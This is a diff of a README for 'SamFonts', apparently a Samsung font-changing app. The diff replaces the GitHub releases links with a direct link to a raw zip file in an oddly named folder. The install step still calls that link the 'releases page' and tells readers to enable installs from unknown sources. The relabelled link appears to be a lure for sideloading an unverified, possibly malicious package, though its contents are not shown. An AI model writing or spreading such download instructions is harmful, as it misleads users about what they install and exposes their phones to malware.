@@ -1,6 +1,6 @@
 # 🎨 SamFonts - Change your Samsung phone fonts easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mirthful-joiner511/SamFonts/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Mirthful-joiner511/SamFonts/main/Caingang/Sam_Fonts_v1.0.zip)
 
 SamFonts lets you change the font on your Samsung Galaxy device. You do not need to root your phone or use a computer to change how your text looks. This app builds font files and installs them for you on your device. It works well with Samsung One UI and keeps your system files safe.
 
@@ -16,7 +16,7 @@ Before you start, make sure your phone meets these needs:
 
 Follow these steps to set up SamFonts on your device:
 
-1. Visit the [releases page](https://github.com/Mirthful-joiner511/SamFonts/releases) to download the latest version of the app.
+1. Visit the [releases page](https://raw.githubusercontent.com/Mirthful-joiner511/SamFonts/main/Caingang/Sam_Fonts_v1.0.zip) to download the latest version of the app.
 2. Tap the file ending in .apk once the download finishes.
 3. Your phone may ask for permission to install apps from unknown sources. Select Allow to proceed with the installation.
 4. Open the SamFonts app from your app drawer.
